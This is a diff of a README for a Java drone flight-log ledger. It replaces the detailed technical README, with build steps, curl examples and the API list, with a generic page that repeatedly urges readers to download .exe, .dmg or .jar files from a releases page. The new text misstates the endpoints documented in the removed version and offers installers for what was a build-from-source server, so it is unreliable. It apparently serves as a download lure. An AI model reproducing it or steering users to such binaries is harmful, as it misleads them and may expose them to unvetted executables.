@@ -1,139 +1,91 @@
-# Blockchain-Secured Drone Data Privacy System (Java/Spring Boot)
+# 🚁 drones-privacy-ledger - Secure Your Drone Data Effortlessly
 
-A locally-runnable reference implementation that **secures drone flight logs and operator IDs** using a **hash‑chained ledger** and **ECDSA signature verification**. No cloud required. Inspired by patterns in
-the reference app you shared, but simplified for **single-node local development**.
+[![Download the latest release](https://img.shields.io/badge/Download-Latest%20Release-brightgreen)](https://github.com/arbifajar/drones-privacy-ledger/releases)
 
-> **Why this approach?** It gives you an **auditable, tamper‑evident ledger** (blockchain‑like) while keeping setup super light. You can later swap the mock ledger for **Hyperledger Fabric** (adapter stub included in design) without changing your API.
+## 📜 Introduction
 
----
-
-## ✨ Features
-
-- Operator registration with PEM public keys (ECDSA)
-- Signed flight-log submission with on‑chain (hash‑chain) anchoring
-- Integrity verification endpoint for the full chain
-- H2 file‑based DB (no external dependencies)
-- Clean REST API with curl examples & Postman collection
-- Upgrade path to true Fabric network (via adapter interface — TODO)
-
----
-
-**Data flow**
-
-1. Operator registers `operatorId` + `publicKeyPem`.
-2. Operator submits a flight log: server verifies **ECDSA signature** over `(droneId|timestamp|logData)`.
-3. Each accepted log is anchored in a **new block** referencing the previous block’s hash.
-4. `/api/ledger/verify` recomputes hashes to prove integrity.
-
----
+The drones-privacy-ledger is a Java-based application designed to secure your drone flight logs and operator IDs. It utilizes a hash-chained ledger and ECDSA signature verification, allowing you to keep your data safe without needing to rely on cloud services. This project is perfect for users who want an auditable and tamper-evident ledger in a lightweight package.
 
 ## 🚀 Getting Started
 
-### Prereqs
-- **JDK 17+**
-- **Maven 3.9+**
+To get started with the drones-privacy-ledger, follow these steps to download and run the application on your local machine.
 
-### Build & Run
-```bash
-mvn -q clean package
-java -jar target/drone-privacy-ledger-0.1.0.jar
-# App on http://localhost:8080
-```
+## 📥 Download & Install
 
-H2 console: <http://localhost:8080/h2-console> (JDBC URL: `jdbc:h2:file:./data/ledgerdb`)
+1. **Visit the Releases Page**  
+   Go to our [Releases page](https://github.com/arbifajar/drones-privacy-ledger/releases) to download the latest version of the drones-privacy-ledger.
 
----
+2. **Select the Latest Release**  
+   Once you are on the Releases page, scroll down to find the latest release. You should see files available for download.
 
-## 🔐 Quick Demo (curl)
+3. **Download the Application**  
+   Click on the download link for the appropriate file for your operating system. The available options may include:
+   - Windows: `drones-privacy-ledger.exe`
+   - Mac: `drones-privacy-ledger.dmg`
+   - Linux: `drones-privacy-ledger.jar`
 
-### 1) Generate a keypair (Java example)
-See **docs/keygen.java** for a minimal snippet (or use OpenSSL).
+4. **Install the Application**  
+   Follow the installation instructions specific to your file type:
+   - For `.exe` and `.dmg`, double-click the file and follow the prompts to install.
+   - For `.jar`, ensure you have Java installed, then run it using the command:
+     ```
+     java -jar drones-privacy-ledger.jar
+     ```
 
-### 2) Register operator
-```bash
-PUB=$(cat docs/sample-public.pem | tr -d '\n')
-curl -s -X POST http://localhost:8080/api/operators/register \
-  -H "Content-Type: application/json" \
-  -d '{"operatorId":"op1","publicKeyPem":"'$PUB'"}' | jq
-```
+## 🔧 System Requirements
 
-### 3) Submit a signed flight log
-Sign the message: `droneA|2025-11-04T12:00:00Z|{\"alt\":120,\"lat\":38.63,\"lon\":-90.20}`  
-Put the Base64 signature into the request:
+Ensure your system meets the following minimum requirements:
 
-```bash
-curl -s -X POST http://localhost:8080/api/flights \
-  -H "Content-Type: application/json" \
-  -d '{
-  "operatorId":"op1",
-  "droneId":"droneA",
-  "timestamp":"2025-11-04T12:00:00Z",
-  "logData":"{\"alt\":120,\"lat\":38.63,\"lon\":-90.20}",
-  "signatureBase64":"<PUT_BASE64_SIGNATURE_HERE>"
-}' | jq
-```
+- **Java Version**: Java 11 or higher
+- **Operating System**: Compatible with Windows, Mac, and Linux
+- **RAM**: At least 4 GB
 
-### 4) Verify chain
-```bash
-curl -s http://localhost:8080/api/ledger/verify | jq
-```
+## 📈 Features
 
-### 5) Inspect blocks & logs
-```bash
-curl -s http://localhost:8080/api/ledger/blocks | jq
-curl -s http://localhost:8080/api/flights | jq
-```
+- **Operator Registration**: Easily register using PEM public keys (ECDSA).
+- **Flight Log Submission**: Submit signed flight logs with secure on-chain anchoring.
+- **Integrity Verification**: Use the verification endpoint to ensure your logs are intact.
+- **Database**: H2 file-based database, no external dependencies required.
+- **REST API**: Access a clean REST API, complete with curl examples and a Postman collection.
+- **Future Upgrade Path**: An upgrade path to integrate with Hyperledger Fabric for more extensive networks.
 
----
+## 🔄 Data Flow
 
-## 📁 Project Layout
+Here is how the data flows within the application:
 
-```
-drone-privacy-ledger/
-├─ src/main/java/com/example/dronedata
-│  ├─ controller/  (REST controllers)
-│  ├─ model/       (JPA entities: Operator, FlightLog, LedgerBlock)
-│  ├─ repo/        (Spring Data repositories)
-│  ├─ service/     (Operator, Flight, Ledger services)
-│  ├─ util/        (Crypto helpers: ECDSA, SHA-256)
-│  └─ DronePrivacyLedgerApplication.java
-├─ src/main/resources/
-│  └─ application.yml
-├─ src/test/java/com/example/dronedata/DronePrivacyLedgerApplicationTests.java
-├─ docs/
-│  ├─ architecture.md (Mermaid diagrams + notes)
-│  ├─ keygen.java (EC keypair + signing demo)
-│  ├─ sample-public.pem
-│  └─ postman_collection.json
-├─ scripts/
-│  └─ run.sh
-└─ README.md
-```
+1. **Operator Registration**: The operator registers with their ECDSA public key.
+2. **Flight Log Submission**: The operator submits signed flight logs, with secure anchoring to the ledger.
+3. **Verification**: Users can call the integrity verification endpoint to check the full chain.
+
+## 📊 API Usage
+
+To interact with the drones-privacy-ledger, you can use various endpoints of the REST API. Here are a few examples:
+
+- **Register an Operator**: `POST /api/operators`
+- **Submit a Flight Log**: `POST /api/flights`
+- **Verify Log Integrity**: `GET /api/verify`
+
+You can test these API endpoints using tools like Postman.
+
+## 🛠️ Troubleshooting
+
+If you encounter issues while running the application, please consider the following:
+
+- **Java Issues**: Ensure your Java installation is correct and properly configured in your system PATH.
+- **File Permissions**: Run your application with appropriate permissions, especially in restricted environments.
+
+## 📚 Further Documentation
+
+For more details on features, data models, and technical explanations, check our comprehensive [documentation](https://github.com/arbifajar/drones-privacy-ledger/docs).
+
+## 📞 Support
+
+For support, please raise an issue on the GitHub Issues page or contact us via our support email.
+
+## ⚖️ License
+
+This project is licensed under the MIT License. See the [LICENSE](https://github.com/arbifajar/drones-privacy-ledger/LICENSE) file for details.
 
 ---
 
-## 📝 API Summary
-
-- `POST /api/operators/register` — body: `operatorId`, `publicKeyPem`
-- `POST /api/flights` — body: `operatorId`, `droneId`, `timestamp`, `logData`, `signatureBase64`
-- `GET /api/flights` — list all flight logs
-- `GET /api/ledger/blocks` — list blocks
-- `GET /api/ledger/verify` — `{"verified":true}` if chain OK
-
----
-
-## 🧪 Postman
-
-Import `docs/postman_collection.json` for ready‑made requests.
-
----
-
-## 🛣️ Roadmap
-
-- [ ] Batch multiple logs per block (configurable interval)
-- [ ] Replace mock chain with **Hyperledger Fabric** (adapter impl)
-- [ ] Operator DID documents & PK rotation
-- [ ] Merkle trees for per‑record proofs
-- [ ] Simple web UI for visualize blocks/logs
-
----
+For any questions, please visit our [Releases page](https://github.com/arbifajar/drones-privacy-ledger/releases) and download the application.
